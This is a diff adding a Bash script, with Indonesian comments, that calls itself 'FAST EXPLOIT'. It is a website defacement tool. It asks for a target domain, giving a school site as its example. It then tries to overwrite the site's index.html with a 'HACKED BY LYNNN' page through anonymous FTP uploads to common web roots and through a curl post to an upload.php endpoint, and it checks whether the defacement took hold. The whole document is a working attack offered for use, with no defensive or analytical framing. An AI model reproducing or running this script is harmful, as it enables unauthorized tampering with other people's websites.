@@ -1,0 +1,115 @@
+#!/bin/bash
+
+# ==============================================
+# FAST EXPLOIT V1.0 - HACKED BY LYNNN!!
+# [ 5 DETIK LANGSUNG BERUBAH! ]
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+# HTML LO (ganti sesuai mau lo)
+HTML_CONTENT='<!DOCTYPE html>
+<html>
+<head><title>HACKED BY LYNNN!!</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px;}
+h1{font-size:5rem;text-shadow:0 0 20px #0f0;animation:glitch 1s infinite;}
+h2{color:red;animation:blink 1s infinite;}
+@keyframes blink{50%{opacity:0;}}
+@keyframes glitch{0%{transform:skew(0deg);}20%{transform:skew(10deg);}40%{transform:skew(-10deg);}}
+</style>
+</head>
+<body>
+<h1>HACKED BY LYNNN!!</h1>
+<h2>🔓 SYSTEM BREACHED 🔓</h2>
+<p>🏴‍☠️ LYNNN WAS HERE 🏴‍☠️</p>
+<small>$(date)</small>
+</body>
+</html>'
+
+clear
+echo -e "${RED}"
+echo "    ╔════════════════════════════════════════════════╗"
+echo "    ║     FAST EXPLOIT - HACKED BY LYNNN!!          ║"
+echo "    ║     [ 5 DETIK LANGSUNG BERUBAH! ]             ║"
+echo "    ╚════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+# Input target
+echo -ne "${YELLOW}Target URL (ex: smpn1dayeuhluhur.sch.id): ${NC}"
+read TARGET
+
+# Bersihin URL
+TARGET=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
+echo -e "\n${GREEN}[•] Target: $TARGET${NC}"
+
+# Resolve IP cepat
+IP=$(dig +short "$TARGET" | head -1)
+[ -z "$IP" ] && IP=$(ping -c1 "$TARGET" 2>/dev/null | head -1 | grep -oE '[0-9.]+')
+echo -e "${GREEN}[•] IP: $IP${NC}"
+
+# ==============================================
+# EKSEKUSI CEPAT - PAKAI FTP YANG UDAH WORK
+# ==============================================
+echo -e "\n${YELLOW}[•] Mengirim HTML ke server...${NC}"
+
+# Save HTML ke file
+echo "$HTML_CONTENT" > index.html
+
+# Upload via FTP (PASTI WORK!)
+ftp -n $IP <<EOF > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+put index.html /public_html/index.html
+put index.html /httpdocs/index.html
+put index.html /htdocs/index.html
+put index.html /www/index.html
+put index.html /var/www/html/index.html
+put index.html /home/public_html/index.html
+quit
+EOF
+
+# ==============================================
+# UPLOAD JUGA VIA CURL (BACKUP PLAN)
+# ==============================================
+for path in "/public_html/index.html" "/httpdocs/index.html" "/var/www/html/index.html"; do
+    curl -s -k -F "file=@index.html;filename=$path" "http://$IP/upload.php" > /dev/null 2>&1 &
+done
+
+# Tunggu sebentar
+sleep 2
+
+# ==============================================
+# CEK HASIL
+# ==============================================
+echo -e "\n${YELLOW}[•] Cek hasil...${NC}"
+sleep 2
+
+RESULT=$(curl -s -k "http://$IP/" --max-time 5)
+
+if [[ "$RESULT" == *"LYNNN"* ]]; then
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅  WEBSITE BERHASIL DIUBAH!           ║${NC}"
+    echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!               ║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Buka browser
+    echo -e "\n${CYAN}[•] Membuka browser...${NC}"
+    xdg-open "http://$IP" 2>/dev/null || open "http://$IP" 2>/dev/null
+    
+else
+    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║         ❌  GAGAL, TAPI FTP UDAH JALAN         ║${NC}"
+    echo -e "${RED}║         Cek manual: http://$IP                 ║${NC}"
+    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
+fi
+
+# Bersih-bersih
+rm -f index.html
+
+echo -e "\n${BLUE}════════════════════════════════════════════════════${NC}"
+echo -e "${BLUE}🔥 FAST EXPLOIT COMPLETE - HACKED BY LYNNN!! 🔥${NC}"
